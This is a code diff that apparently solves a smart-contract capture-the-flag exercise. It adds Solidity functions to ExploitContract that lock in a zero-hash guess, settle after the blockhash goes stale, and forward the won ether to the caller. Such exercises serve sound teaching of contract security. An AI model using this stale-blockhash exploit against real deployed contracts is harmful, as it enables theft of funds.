@@ -53,4 +53,29 @@ contract ExploitContract {
     }
 
     // write your exploit code below
+
+    address exploiter;
+
+    receive() external payable {}
+
+    function answerWithZero() public payable {
+        require(exploiter == address(0), "Already used");
+        exploiter = payable(msg.sender);
+
+        bytes32 zeroHash = bytes32(0);
+        predictTheBlockhash.lockInGuess{value: 1 ether}(zeroHash);
+    }
+
+    function settleOrRevert() public {
+        require(exploiter == msg.sender);
+
+        uint256 balanceBefore = address(this).balance;
+        predictTheBlockhash.settle();
+        uint256 balanceAfter = address(this).balance;
+
+        require(balanceAfter > balanceBefore);
+
+        (bool ok, ) = exploiter.call{value: balanceAfter}("");
+        require(ok, "Failed to send to msg.sender");
+    }
 }
